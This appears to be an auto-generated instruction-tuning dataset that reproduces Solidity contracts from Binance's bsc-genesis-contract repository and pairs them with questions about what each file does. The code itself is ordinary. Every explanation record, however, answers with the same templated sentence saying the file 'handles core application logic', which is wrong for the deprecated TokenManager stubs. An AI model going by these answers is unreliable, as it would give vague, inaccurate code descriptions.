{"instruction": "Show me the code for TokenManager.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\TokenManager.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/IBEP20.sol\";\nimport \"../interface/0.6.x/IApplication.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\nimport \"../System.sol\";\n\ncontract TokenManager is System, IApplication, IParamSubscriber {\n    using SafeMath for uint256;\n\n    // BC to BSC\n    struct BindSynPackage {\n        uint8 packageType;\n        bytes32 bep2TokenSymbol;\n        address contractAddr;\n        uint256 totalSupply;\n        uint256 peggyAmount;\n        uint8 bep20Decimals;\n        uint64 expireTime;\n    }\n\n    mapping(bytes32 => BindSynPackage) public bindPackageRecord;\n\n    mapping(address => bool) public mirrorPendingRecord;  // @dev deprecated\n    mapping(address => bool) public boundByMirror;  // @dev deprecated\n    uint256 public mirrorFee;  // @dev deprecated\n    uint256 public syncFee;  // @dev deprecated\n\n    event bindSuccess(address indexed contractAddr, string bep2Symbol, uint256 totalSupply, uint256 peggyAmount);  // @dev deprecated\n    event bindFailure(address indexed contractAddr, string bep2Symbol, uint32 failedReason);  // @dev deprecated\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event mirrorSuccess(address indexed bep20Addr, bytes32 bep2Symbol);  // @dev deprecated\n    event mirrorFailure(address indexed bep20Addr, uint8 errCode);  // @dev deprecated\n    event syncSuccess(address indexed bep20Addr);  // @dev deprecated\n    event syncFailure(address indexed bep20Addr, uint8 errCode);  // @dev deprecated\n\n    function handleSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external override onlyCrossChainContract returns (bytes memory) {\n        revert(\"deprecated\");\n    }\n\n    function handleAckPackage(uint8 channelId, bytes calldata msgBytes) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function handleFailAckPackage(uint8 channelId, bytes calldata msgBytes) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function approveBind(address contractAddr, string memory bep2Symbol) public payable returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function rejectBind(address contractAddr, string memory bep2Symbol) public payable returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function expireBind(string memory bep2Symbol) public payable returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function mirror(address bep20Addr, uint64 expireTime) public payable returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function sync(address bep20Addr, uint64 expireTime) public payable returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyGov {\n        revert(\"deprecated\");\n    }\n\n    function queryRequiredLockAmountForBind(string memory symbol) public view returns (uint256) {\n        bytes32 bep2Symbol;\n        assembly {\n            bep2Symbol := mload(add(symbol, 32))\n        }\n        BindSynPackage memory bindRequest = bindPackageRecord[bep2Symbol];\n        if (bindRequest.contractAddr == address(0x00)) {\n            return 0;\n        }\n        uint256 tokenHubBalance = IBEP20(bindRequest.contractAddr).balanceOf(TOKEN_HUB_ADDR);\n        uint256 requiredBalance = bindRequest.totalSupply.sub(bindRequest.peggyAmount);\n        return requiredBalance.sub(tokenHubBalance);\n    }\n}\n\n```"}
{"instruction": "What does the file TokenManager.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/IBEP20.sol\";\nimport \"../interface/0.6.x/IApplication.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\nimport \"../System.sol\";\n\ncontract TokenManager is System, IApplication, IParamSubscriber {\n    using SafeMath for uint256;\n\n    // BC to BSC\n    struct BindSynPackage {\n        uint8 packageType;\n        bytes32 bep2TokenSymbol;\n        address contractAddr;\n        uint256 totalSupply;\n        uint256 peggyAmount;\n        uint8 bep20Decimals;\n        uint64 expireTime;\n    }\n\n    mapping(bytes32 => BindSynPackage) public bindPackageRecord;\n\n    mapping(address => bool) public mirrorPendingRecord;  // @dev deprecated\n    mapping(address => bool) public boundByMirror;  // @dev deprecated\n    uint256 public mirrorFee;  // @dev deprecated\n    uint256 public syncFee;  // @dev deprecated\n\n    event bindSuccess(address indexed contractAddr, string bep2Symbol, uint256 totalSupply, uint256 peggyAmount);  // @dev deprecated\n    event bindFailure(address indexed contractAddr, string bep2Symbol, uint32 failedReason);  // @dev deprecated\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event mirrorSuccess(address indexed bep20Addr, bytes32 bep2Symbol);  // @dev deprecated\n    event mirrorFailure(address indexed bep20Addr, uint8 errCode);  // @dev deprecated\n    event syncSuccess(address indexed bep20Addr);  // @dev deprecated\n    event syncFailure(address indexed bep20Addr, uint8 errCode);  // @dev deprecated\n\n    function handleSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external override onlyCrossChainContract returns (bytes memory) {\n        revert(\"deprecated\");\n    }\n\n    function handleAckPackage(uint8 channelId, bytes calldata msgBytes) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function handleFailAckPack\n```", "output": "This file `TokenManager.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BSCValidatorSetTool.sol which is part of the extension project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\extension\\BSCValidatorSetTool.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/RLPDecode.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\n\ncontract BSCValidatorSetTool {\n    bytes public constant INIT_VALIDATORSET_BYTES =\n        hex\"f84580f842f840949fb29aac15b9a4b7f17c3385939b007540f4d791949fb29aac15b9a4b7f17c3385939b007540f4d791949fb29aac15b9a4b7f17c3385939b007540f4d79164\";\n\n    using RLPDecode for *;\n\n    struct Validator {\n        address consensusAddress;\n        address payable feeAddress;\n        address BBCFeeAddress;\n        uint64 votingPower;\n    }\n\n    struct IbcValidatorSetPackage {\n        uint8 packageType;\n        Validator[] validatorSet;\n    }\n\n    function init() external pure {\n        bool valid = decodeValidatorSetSynPackage(INIT_VALIDATORSET_BYTES);\n        require(valid, \"failed to init\");\n    }\n\n    function decodeValidatorSetSynPackage(bytes memory msgBytes) internal pure returns (bool) {\n        IbcValidatorSetPackage memory validatorSetPkg;\n\n        RLPDecode.Iterator memory iter = msgBytes.toRLPItem().iterator();\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                validatorSetPkg.packageType = uint8(iter.next().toUint());\n            } else if (idx == 1) {\n                RLPDecode.RLPItem[] memory items = iter.next().toList();\n                validatorSetPkg.validatorSet = new Validator[](items.length);\n                for (uint256 j = 0; j < items.length; ++j) {\n                    (Validator memory val, bool ok) = decodeValidator(items[j]);\n                    if (!ok) {\n                        return false;\n                    }\n                    validatorSetPkg.validatorSet[j] = val;\n                }\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return success;\n    }\n\n    function decodeValidator(RLPDecode.RLPItem memory itemValidator) internal pure returns (Validator memory, bool) {\n        Validator memory validator;\n        RLPDecode.Iterator memory iter = itemValidator.iterator();\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                validator.consensusAddress = iter.next().toAddress();\n            } else if (idx == 1) {\n                validator.feeAddress = address(uint160(iter.next().toAddress()));\n            } else if (idx == 2) {\n                validator.BBCFeeAddress = iter.next().toAddress();\n            } else if (idx == 3) {\n                validator.votingPower = uint64(iter.next().toUint());\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return (validator, success);\n    }\n\n    // | type   | relayFee   |package  |\n    // | 1 byte | 32 bytes   | bytes    |\n    function decodePayloadHeader(bytes memory payload) public pure returns (bool, uint8, uint256, bytes memory) {\n        if (payload.length < 33) {\n            return (false, 0, 0, new bytes(0));\n        }\n\n        uint256 ptr;\n        assembly {\n            ptr := payload\n        }\n\n        uint8 packageType;\n        ptr += 1;\n        assembly {\n            packageType := mload(ptr)\n        }\n\n        uint256 relayFee;\n        ptr += 32;\n        assembly {\n            relayFee := mload(ptr)\n        }\n\n        ptr += 32;\n        bytes memory msgBytes = new bytes(payload.length - 33);\n        (uint256 dst,) = Memory.fromBytes(msgBytes);\n        Memory.copy(ptr, dst, payload.length - 33);\n\n        return (true, packageType, relayFee, msgBytes);\n    }\n}\n\n```"}
{"instruction": "What does the file BSCValidatorSetTool.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/RLPDecode.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\n\ncontract BSCValidatorSetTool {\n    bytes public constant INIT_VALIDATORSET_BYTES =\n        hex\"f84580f842f840949fb29aac15b9a4b7f17c3385939b007540f4d791949fb29aac15b9a4b7f17c3385939b007540f4d791949fb29aac15b9a4b7f17c3385939b007540f4d79164\";\n\n    using RLPDecode for *;\n\n    struct Validator {\n        address consensusAddress;\n        address payable feeAddress;\n        address BBCFeeAddress;\n        uint64 votingPower;\n    }\n\n    struct IbcValidatorSetPackage {\n        uint8 packageType;\n        Validator[] validatorSet;\n    }\n\n    function init() external pure {\n        bool valid = decodeValidatorSetSynPackage(INIT_VALIDATORSET_BYTES);\n        require(valid, \"failed to init\");\n    }\n\n    function decodeValidatorSetSynPackage(bytes memory msgBytes) internal pure returns (bool) {\n        IbcValidatorSetPackage memory validatorSetPkg;\n\n        RLPDecode.Iterator memory iter = msgBytes.toRLPItem().iterator();\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                validatorSetPkg.packageType = uint8(iter.next().toUint());\n            } else if (idx == 1) {\n                RLPDecode.RLPItem[] memory items = iter.next().toList();\n                validatorSetPkg.validatorSet = new Validator[](items.length);\n                for (uint256 j = 0; j < items.length; ++j) {\n                    (Validator memory val, bool ok) = decodeValidator(items[j]);\n                    if (!ok) {\n                        return false;\n                    }\n                    validatorSetPkg.validatorSet[j] = val;\n                }\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return success;\n    }\n\n    function decodeValidator(RLPDecode.RLPItem memory itemValidator) internal pure returns (Validator memory, bool) {\n        Validator memory valid\n```", "output": "This file `BSCValidatorSetTool.sol` is part of the extension project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Protectable.sol which is part of the extension project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\extension\\Protectable.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\nabstract contract Protectable is Initializable {\n    /*----------------- storage -----------------*/\n    bool private _paused;\n    address private _protector;\n    mapping(address => bool) public blackList;\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x1785c681\n    error AlreadyPaused();\n    error NotPaused();\n    // @notice signature: 0xb1d02c3d\n    error InBlackList();\n    // @notice signature: 0x06fbb1e3\n    error OnlyProtector();\n\n    /*----------------- events -----------------*/\n    event Paused();\n    event Resumed();\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event BlackListed(address indexed target);\n    event UnBlackListed(address indexed target);\n\n    /*----------------- modifier -----------------*/\n    modifier whenNotPaused() {\n        if (_paused) revert AlreadyPaused();\n        _;\n    }\n\n    modifier whenPaused() {\n        if (!_paused) revert NotPaused();\n        _;\n    }\n\n    modifier onlyProtector() {\n        if (msg.sender != _protector) revert OnlyProtector();\n        _;\n    }\n\n    modifier notInBlackList() {\n        if (blackList[msg.sender]) revert InBlackList();\n        _;\n    }\n\n    /*----------------- initializer -----------------*/\n    function __Protectable_init(address protector) internal onlyInitializing {\n        __Protectable_init_unchained(protector);\n    }\n\n    function __Protectable_init_unchained(address protector) internal onlyInitializing {\n        _protector = protector;\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @return whether the system is paused\n     */\n    function isPaused() external view returns (bool) {\n        return _paused;\n    }\n\n    /**\n     * @dev Pause the whole system in emergency\n     */\n    function pause() external virtual onlyProtector whenNotPaused {\n        _paused = true;\n        emit Paused();\n    }\n\n    /**\n     * @dev Resume the whole system\n     */\n    function resume() external virtual onlyProtector whenPaused {\n        _paused = false;\n        emit Resumed();\n    }\n\n    /**\n     * @dev Add an address to the black list\n     */\n    function addToBlackList(address account) external virtual onlyProtector {\n        blackList[account] = true;\n        emit BlackListed(account);\n    }\n\n    /**\n     * @dev Remove an address from the black list\n     */\n    function removeFromBlackList(address account) external virtual onlyProtector {\n        delete blackList[account];\n        emit UnBlackListed(account);\n    }\n\n    /*----------------- internal functions -----------------*/\n    function _setProtector(address protector) internal {\n        emit ProtectorChanged(_protector, protector);\n        _protector = protector;\n    }\n\n    /*----------------- view functions -----------------*/\n    function getProtector() external view returns (address) {\n        return _protector;\n    }\n\n    uint256[50] private __reservedSlot;\n}\n\n```"}
{"instruction": "What does the file Protectable.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\nabstract contract Protectable is Initializable {\n    /*----------------- storage -----------------*/\n    bool private _paused;\n    address private _protector;\n    mapping(address => bool) public blackList;\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x1785c681\n    error AlreadyPaused();\n    error NotPaused();\n    // @notice signature: 0xb1d02c3d\n    error InBlackList();\n    // @notice signature: 0x06fbb1e3\n    error OnlyProtector();\n\n    /*----------------- events -----------------*/\n    event Paused();\n    event Resumed();\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event BlackListed(address indexed target);\n    event UnBlackListed(address indexed target);\n\n    /*----------------- modifier -----------------*/\n    modifier whenNotPaused() {\n        if (_paused) revert AlreadyPaused();\n        _;\n    }\n\n    modifier whenPaused() {\n        if (!_paused) revert NotPaused();\n        _;\n    }\n\n    modifier onlyProtector() {\n        if (msg.sender != _protector) revert OnlyProtector();\n        _;\n    }\n\n    modifier notInBlackList() {\n        if (blackList[msg.sender]) revert InBlackList();\n        _;\n    }\n\n    /*----------------- initializer -----------------*/\n    function __Protectable_init(address protector) internal onlyInitializing {\n        __Protectable_init_unchained(protector);\n    }\n\n    function __Protectable_init_unchained(address protector) internal onlyInitializing {\n        _protector = protector;\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @return whether the system is paused\n     */\n    function isPaused() external view returns (bool) {\n        return _paused;\n    }\n\n    /**\n     * @dev Pause the whole system in emergency\n     */\n    function pause() external virtual onlyProtector whenNot\n```", "output": "This file `Protectable.sol` is part of the extension project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BytesLib.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\BytesLib.sol`:\n\n```sol\n/*\n * @title Solidity Bytes Arrays Utils\n * @author GonÃ§alo SÃ¡ <goncalo.sa@consensys.net>\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev Bytes tightly packed arrays utility library for ethereum contracts written in Solidity.\n *      The library lets you concatenate, slice and type cast bytes arrays both in memory and storage.\n */\n\npragma solidity 0.6.4;\n\nlibrary BytesLib {\n    function concat(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes memory) {\n        bytes memory tempBytes;\n\n        assembly {\n            // Get a location of some free memory and store it in tempBytes as\n            // Solidity does for memory variables.\n            tempBytes := mload(0x40)\n\n            // Store the length of the first bytes array at the beginning of\n            // the memory for tempBytes.\n            let length := mload(_preBytes)\n            mstore(tempBytes, length)\n\n            // Maintain a memory counter for the current write location in the\n            // temp bytes array by adding the 32 bytes for the array length to\n            // the starting location.\n            let mc := add(tempBytes, 0x20)\n            // Stop copying when the memory counter reaches the length of the\n            // first bytes array.\n            let end := add(mc, length)\n\n            for {\n                // Initialize a copy counter to the start of the _preBytes data,\n                // 32 bytes into its memory.\n                let cc := add(_preBytes, 0x20)\n            } lt(mc, end) {\n                // Increase both counters by 32 bytes each iteration.\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } {\n                // Write the _preBytes data into the tempBytes memory 32 bytes\n                // at a time.\n                mstore(mc, mload(cc))\n            }\n\n            // Add the length of _postBytes to the current length of tempBytes\n            // and store it as the new length in the first 32 bytes of the\n            // tempBytes memory.\n            length := mload(_postBytes)\n            mstore(tempBytes, add(length, mload(tempBytes)))\n\n            // Move the memory counter back from a multiple of 0x20 to the\n            // actual end of the _preBytes data.\n            mc := end\n            // Stop copying when the memory counter reaches the new combined\n            // length of the arrays.\n            end := add(mc, length)\n\n            for { let cc := add(_postBytes, 0x20) } lt(mc, end) {\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } { mstore(mc, mload(cc)) }\n\n            // Update the free-memory pointer by padding our last write location\n            // to 32 bytes: add 31 bytes to the end of tempBytes to move to the\n            // next 32 byte block, then round down to the nearest multiple of\n            // 32. If the sum of the length of the two arrays is zero then add\n            // one before rounding down to leave a blank 32 bytes (the length block with 0).\n            mstore(\n                0x40,\n                and(\n                    add(add(end, iszero(add(length, mload(_preBytes)))), 31),\n                    not(31) // Round down to the nearest 32 bytes.\n                )\n            )\n        }\n\n        return tempBytes;\n    }\n\n    function concatStorage(bytes storage _preBytes, bytes memory _postBytes) internal {\n        assembly {\n            // Read the first 32 bytes of _preBytes storage, which is the length\n            // of the array. (We don't need to use the offset into the slot\n            // because arrays use the entire slot.)\n            let fslot := sload(_preBytes_slot)\n            // Arrays of 31 bytes or less have an even value in their slot,\n            // while longer arrays have an odd value. The actual length is\n            // the slot divided by two for odd values, and the lowest order\n            // byte divided by two for even values.\n            // If the slot is even, bitwise and the slot with 255 and divide by\n            // two to get the length. If the slot is odd, bitwise and the slot\n            // with -1 and divide by two.\n            let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n            let mlength := mload(_postBytes)\n            let newlength := add(slength, mlength)\n            // slength can contain both the length and contents of the array\n            // if length < 32 bytes so let's prepare for that\n            // v. http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage\n            switch add(lt(slength, 32), lt(newlength, 32))\n            case 2 {\n                // Since the new array still fits in the slot, we just need to\n                // update the contents of the slot.\n                // uint256(bytes_storage) = uint256(bytes_storage) + uint256(bytes_memory) + new_length\n                sstore(\n                    _preBytes_slot,\n                    // all the modifications to the slot are inside this\n                    // next block\n                    add(\n                        // we can just add to the slot contents because the\n                        // bytes we want to change are the LSBs\n                        fslot,\n                        add(\n                            mul(\n                                div(\n                                    // load the bytes from memory\n                                    mload(add(_postBytes, 0x20)),\n                                    // zero all bytes to the right\n                                    exp(0x100, sub(32, mlength))\n                                ),\n                                // and now shift left the number of bytes to\n                                // leave space for the length in the slot\n                                exp(0x100, sub(32, newlength))\n                            ),\n                            // increase length by the double of the memory\n                            // bytes length\n                            mul(mlength, 2)\n                        )\n                    )\n                )\n            }\n            case 1 {\n                // The stored value fits in the slot, but the combined value\n                // will exceed it.\n                // get the keccak hash to get the contents of the array\n                mstore(0x0, _preBytes_slot)\n                let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n\n                // save new length\n                sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n\n                // The contents of the _postBytes array start 32 bytes into\n                // the structure. Our first read should obtain the `submod`\n                // bytes that can fit into the unused space in the last word\n                // of the stored array. To get this, we read 32 bytes starting\n                // from `submod`, so the data we read overlaps with the array\n                // contents by `submod` bytes. Masking the lowest-order\n                // `submod` bytes allows us to add that value directly to the\n                // stored value.\n\n                let submod := sub(32, slength)\n                let mc := add(_postBytes, submod)\n                let end := add(_postBytes, mlength)\n                let mask := sub(exp(0x100, submod), 1)\n\n                sstore(\n                    sc,\n                    add(\n                        and(fslot, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00),\n                        and(mload(mc), mask)\n                    )\n                )\n\n                for {\n                    mc := add(mc, 0x20)\n                    sc := add(sc, 1)\n                } lt(mc, end) {\n                    sc := add(sc, 1)\n                    mc := add(mc, 0x20)\n                } { sstore(sc, mload(mc)) }\n\n                mask := exp(0x100, sub(mc, end))\n\n                sstore(sc, mul(div(mload(mc), mask), mask))\n            }\n            default {\n                // get the keccak hash to get the contents of the array\n                mstore(0x0, _preBytes_slot)\n                // Start copying to the last used word of the stored array.\n                let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n\n                // save new length\n                sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n\n                // Copy over the first `submod` bytes of the new data as in\n                // case 1 above.\n                let slengthmod := mod(slength, 32)\n                let mlengthmod := mod(mlength, 32)\n                let submod := sub(32, slengthmod)\n                let mc := add(_postBytes, submod)\n                let end := add(_postBytes, mlength)\n                let mask := sub(exp(0x100, submod), 1)\n\n                sstore(sc, add(sload(sc), and(mload(mc), mask)))\n\n                for {\n                    sc := add(sc, 1)\n                    mc := add(mc, 0x20)\n                } lt(mc, end) {\n                    sc := add(sc, 1)\n                    mc := add(mc, 0x20)\n                } { sstore(sc, mload(mc)) }\n\n                mask := exp(0x100, sub(mc, end))\n\n                sstore(sc, mul(div(mload(mc), mask), mask))\n            }\n        }\n    }\n\n    function slice(bytes memory _bytes, uint256 _start, uint256 _length) internal pure returns (bytes memory) {\n        require(_bytes.length >= (_start + _length));\n\n        bytes memory tempBytes;\n\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                // Get a location of some free memory and store it in tempBytes as\n                // Solidity does for memory variables.\n                tempBytes := mload(0x40)\n\n                // The first word of the slice result is potentially a partial\n                // word read from the original array. To read it, we calculate\n                // the length of that partial word and start copying that many\n                // bytes into the array. The first word we copy will start with\n                // data we don't care about, but the last `lengthmod` bytes will\n                // land at the beginning of the contents of the new array. When\n                // we're done copying, we overwrite the full first word with\n                // the actual length of the slice.\n                let lengthmod := and(_length, 31)\n\n                // The multiplication in the next line is necessary\n                // because when slicing multiples of 32 bytes (lengthmod == 0)\n                // the following copy loop was copying the origin's length\n                // and then ending prematurely not copying everything it should.\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    // The multiplication in the next line has the same exact purpose\n                    // as the one above.\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } { mstore(mc, mload(cc)) }\n\n                mstore(tempBytes, _length)\n\n                //update free-memory pointer\n                //allocating the array padded to 32 bytes like the compiler does now\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            //if we want a zero-length slice let's just return a zero-length array\n            default {\n                tempBytes := mload(0x40)\n\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n\n    function toAddress(bytes memory _bytes, uint256 _start) internal pure returns (address) {\n        require(_bytes.length >= (_start + 20));\n        address tempAddress;\n\n        assembly {\n            tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)\n        }\n\n        return tempAddress;\n    }\n\n    function toUint8(bytes memory _bytes, uint256 _start) internal pure returns (uint8) {\n        require(_bytes.length >= (_start + 1));\n        uint8 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x1), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint16(bytes memory _bytes, uint256 _start) internal pure returns (uint16) {\n        require(_bytes.length >= (_start + 2));\n        uint16 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x2), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint32(bytes memory _bytes, uint256 _start) internal pure returns (uint32) {\n        require(_bytes.length >= (_start + 4));\n        uint32 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x4), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint64(bytes memory _bytes, uint256 _start) internal pure returns (uint64) {\n        require(_bytes.length >= (_start + 8));\n        uint64 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x8), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint96(bytes memory _bytes, uint256 _start) internal pure returns (uint96) {\n        require(_bytes.length >= (_start + 12));\n        uint96 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0xc), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint128(bytes memory _bytes, uint256 _start) internal pure returns (uint128) {\n        require(_bytes.length >= (_start + 16));\n        uint128 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x10), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toUint(bytes memory _bytes, uint256 _start) internal pure returns (uint256) {\n        require(_bytes.length >= (_start + 32));\n        uint256 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x20), _start))\n        }\n\n        return tempUint;\n    }\n\n    function toBytes32(bytes memory _bytes, uint256 _start) internal pure returns (bytes32) {\n        require(_bytes.length >= (_start + 32));\n        bytes32 tempBytes32;\n\n        assembly {\n            tempBytes32 := mload(add(add(_bytes, 0x20), _start))\n        }\n\n        return tempBytes32;\n    }\n\n    function equal(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bool) {\n        bool success = true;\n\n        assembly {\n            let length := mload(_preBytes)\n\n            // if lengths don't match the arrays are not equal\n            switch eq(length, mload(_postBytes))\n            case 1 {\n                // cb is a circuit breaker in the for loop since there's\n                //  no said feature for inline assembly loops\n                // cb = 1 - don't breaker\n                // cb = 0 - break\n                let cb := 1\n\n                let mc := add(_preBytes, 0x20)\n                let end := add(mc, length)\n\n                for { let cc := add(_postBytes, 0x20) }\n                // the next line is the loop condition:\n                // while (uint(mc < end) + cb == 2)\n                eq(add(lt(mc, end), cb), 2) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    // if any of these checks fails then arrays are not equal\n                    if iszero(eq(mload(mc), mload(cc))) {\n                        // unsuccess:\n                        success := 0\n                        cb := 0\n                    }\n                }\n            }\n            default {\n                // unsuccess:\n                success := 0\n            }\n        }\n\n        return success;\n    }\n\n    function equalStorage(bytes storage _preBytes, bytes memory _postBytes) internal view returns (bool) {\n        bool success = true;\n\n        assembly {\n            // we know _preBytes_offset is 0\n            let fslot := sload(_preBytes_slot)\n            // Decode the length of the stored array like in concatStorage().\n            let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n            let mlength := mload(_postBytes)\n\n            // if lengths don't match the arrays are not equal\n            switch eq(slength, mlength)\n            case 1 {\n                // slength can contain both the length and contents of the array\n                // if length < 32 bytes so let's prepare for that\n                // v. http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage\n                if iszero(iszero(slength)) {\n                    switch lt(slength, 32)\n                    case 1 {\n                        // blank the last byte which is the length\n                        fslot := mul(div(fslot, 0x100), 0x100)\n\n                        if iszero(eq(fslot, mload(add(_postBytes, 0x20)))) {\n                            // unsuccess:\n                            success := 0\n                        }\n                    }\n                    default {\n                        // cb is a circuit breaker in the for loop since there's\n                        //  no said feature for inline assembly loops\n                        // cb = 1 - don't breaker\n                        // cb = 0 - break\n                        let cb := 1\n\n                        // get the keccak hash to get the contents of the array\n                        mstore(0x0, _preBytes_slot)\n                        let sc := keccak256(0x0, 0x20)\n\n                        let mc := add(_postBytes, 0x20)\n                        let end := add(mc, mlength)\n\n                        // the next line is the loop condition:\n                        // while (uint(mc < end) + cb == 2)\n                        for { } eq(add(lt(mc, end), cb), 2) {\n                            sc := add(sc, 1)\n                            mc := add(mc, 0x20)\n                        } {\n                            if iszero(eq(sload(sc), mload(mc))) {\n                                // unsuccess:\n                                success := 0\n                                cb := 0\n                            }\n                        }\n                    }\n                }\n            }\n            default {\n                // unsuccess:\n                success := 0\n            }\n        }\n\n        return success;\n    }\n}\n\n```"}
{"instruction": "What does the file BytesLib.sol do?", "input": "```sol\n/*\n * @title Solidity Bytes Arrays Utils\n * @author GonÃ§alo SÃ¡ <goncalo.sa@consensys.net>\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev Bytes tightly packed arrays utility library for ethereum contracts written in Solidity.\n *      The library lets you concatenate, slice and type cast bytes arrays both in memory and storage.\n */\n\npragma solidity 0.6.4;\n\nlibrary BytesLib {\n    function concat(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes memory) {\n        bytes memory tempBytes;\n\n        assembly {\n            // Get a location of some free memory and store it in tempBytes as\n            // Solidity does for memory variables.\n            tempBytes := mload(0x40)\n\n            // Store the length of the first bytes array at the beginning of\n            // the memory for tempBytes.\n            let length := mload(_preBytes)\n            mstore(tempBytes, length)\n\n            // Maintain a memory counter for the current write location in the\n            // temp bytes array by adding the 32 bytes for the array length to\n            // the starting location.\n            let mc := add(tempBytes, 0x20)\n            // Stop copying when the memory counter reaches the length of the\n            // first bytes array.\n            let end := add(mc, length)\n\n            for {\n                // Initialize a copy counter to the start of the _preBytes data,\n                // 32 bytes into its memory.\n                let cc := add(_preBytes, 0x20)\n            } lt(mc, end) {\n                // Increase both counters by 32 bytes each iteration.\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } {\n                // Write the _preBytes data into the tempBytes memory 32 bytes\n                // at a time.\n                mstore(mc, mload(cc))\n            }\n\n            // Add the length of _postBytes to the current length of tempBytes\n            // and store it as the new length in the first 32 bytes of the\n  